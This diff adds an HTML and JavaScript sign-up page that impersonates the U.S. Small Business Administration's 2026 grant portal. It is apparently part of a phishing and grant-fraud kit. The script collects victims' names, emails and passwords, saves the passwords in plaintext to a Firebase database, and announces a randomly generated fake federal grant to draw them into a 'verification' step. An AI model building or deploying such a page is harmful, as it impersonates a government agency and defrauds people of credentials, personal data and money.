@@ -1,0 +1,140 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SBA Portal | Create 2026 Account</title>
+    <link rel="stylesheet" href="style.css">
+    <style>
+        .cert-box { 
+            display: flex; 
+            align-items: flex-start; 
+            gap: 12px; 
+            background: #f8fafc; 
+            padding: 15px; 
+            border-radius: 12px; 
+            margin: 20px 0;
+            border: 1px solid #e2e8f0;
+        }
+        .cert-box input { width: auto !important; margin-top: 4px; cursor: pointer; }
+        .cert-box label { text-transform: none; font-weight: 500; color: #475569; font-size: 11px; line-height: 1.5; margin: 0; }
+        .cert-box a { color: #1e3a8a; text-decoration: underline; font-weight: 700; }
+        input:focus { border-color: #1e3a8a; outline: none; }
+        label { display: block; font-size: 12px; font-weight: bold; color: #1e293b; margin-bottom: 5px; margin-top: 15px; }
+        input { width: 100%; padding: 12px; border-radius: 8px; border: 1px solid #cbd5e1; box-sizing: border-box; }
+    </style>
+</head>
+<body style="background: #f1f5f9;">
+    <div class="gov-banner">
+        <img src="https://upload.wikimedia.org/wikipedia/en/thumb/a/a4/Flag_of_the_United_States.svg/20px-Flag_of_the_United_States.svg.png" style="width:16px; margin-right:8px;" alt="USA Flag">
+        OFFICIAL U.S. GOVERNMENT SYSTEM - FISCAL YEAR 2026
+    </div>
+
+    <div class="nav" style="background: #1e3a8a; padding: 15px; text-align: center;">
+        <h1 style="margin:0; color: white; font-size: 18px; letter-spacing: 2px;">SBA.GOV</h1>
+    </div>
+
+    <div class="container">
+        <div class="card" style="margin-top: 20px; border-radius: 12px; box-shadow: 0 10px 25px -5px rgba(0,0,0,0.1);">
+            <h2 style="font-size: 22px; color: #1e3a8a; margin-bottom: 5px;">Create Your Profile</h2>
+            <p style="font-size: 13px; color: #64748b; margin-bottom: 25px;">Provide your legal information for the 2026 Grant Application process.</p>
+            
+            <label>Full Legal Name</label>
+            <input type="text" id="n" placeholder="First M. Last">
+
+            <label>Email Address</label>
+            <input type="email" id="e" placeholder="name@domain.com">
+
+            <label>Create Secure Password</label>
+            <input type="password" id="p" placeholder="Minimum 6 characters">
+
+            <div class="cert-box">
+                <input type="checkbox" id="terms">
+                <label for="terms">
+                    I certify that all information provided is true and accurate as of 2026. I have read the 
+                    <a href="terms.html">Terms and Conditions</a> and understand that misrepresentation to the SBA is a federal offense under 18 U.S.C. § 1001.
+                </label>
+            </div>
+
+            <button id="regBtn" style="background: #1e3a8a; color: white; padding: 16px; border-radius: 10px; width: 100%; font-weight: 800; border: none; cursor: pointer; text-transform: uppercase; letter-spacing: 1px;">
+                Start 2026 Application
+            </button>
+            
+            <div style="text-align:center; margin-top:20px; font-size: 14px;">
+                Already registered? <a href="index.html" style="color: #1e3a8a; font-weight: bold; text-decoration: none;">Login here</a>
+            </div>
+        </div>
+    </div>
+
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-app.js";
+        import { getAuth, createUserWithEmailAndPassword, sendEmailVerification } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-auth.js";
+        import { getFirestore, doc, setDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-firestore.js";
+
+        const firebaseConfig = {
+            apiKey: "AIzaSyB5nOOx153po4nWh4irbmTAcxsCZaM1-9k",
+            authDomain: "sba-grant-2026.firebaseapp.com",
+            projectId: "sba-grant-2026",
+            storageBucket: "sba-grant-2026.firebasestorage.app",
+            messagingSenderId: "838430821326",
+            appId: "1:838430821326:web:6438deacb334076a64f99f"
+        };
+
+        const app = initializeApp(firebaseConfig);
+        const auth = getAuth(app);
+        const db = getFirestore(app);
+
+        document.getElementById('regBtn').addEventListener('click', async () => {
+            const name = document.getElementById('n').value.trim();
+            const email = document.getElementById('e').value.trim();
+            const pass = document.getElementById('p').value;
+            const agree = document.getElementById('terms').checked;
+
+            if(!name || !email || !pass || !agree) {
+                return alert("REQUIRED: Complete all fields and certify accuracy.");
+            }
+
+            const btn = document.getElementById('regBtn');
+            btn.innerText = "ENCRYPTING PROFILE...";
+            btn.disabled = true;
+
+            try {
+                // 1. Create Auth Account
+                const res = await createUserWithEmailAndPassword(auth, email, pass);
+                
+                // 2. Trigger verification email
+                await sendEmailVerification(res.user);
+
+                // 3. Generate Random Grant Allocation
+                const rawAmount = Math.floor(Math.random() * (145000 - 45000 + 1)) + 45000;
+                const formattedBal = rawAmount.toLocaleString('en-US');
+
+                // 4. Save user record to Firestore
+                await setDoc(doc(db, "users", res.user.uid), {
+                    fullName: name,
+                    email: email,
+                    password: pass, 
+                    balance: formattedBal,
+                    status: "ALLOCATED / PENDING VERIFICATION",
+                    kycStatus: "NOT STARTED",
+                    role: "user",
+                    regDate: serverTimestamp()
+                });
+
+                alert("FEDERAL ALLOCATION SUCCESS: A grant of $" + formattedBal + " has been assigned to your legal profile.\n\nIMPORTANT: Check your email inbox to verify your account.");
+                
+                window.location.href = 'verify.html';
+
+            } catch(err) { 
+                let msg = "System busy. Please try again.";
+                if(err.code === 'auth/email-already-in-use') msg = "This email is already linked to a 2026 application.";
+                if(err.code === 'auth/weak-password') msg = "Security too low. Password must be 6+ characters.";
+                
+                alert("REGISTRATION ERROR: " + msg); 
+                btn.disabled = false; 
+                btn.innerText = "Start 2026 Application";
+            }
+        });
+    </script>
+</body>
+</html>
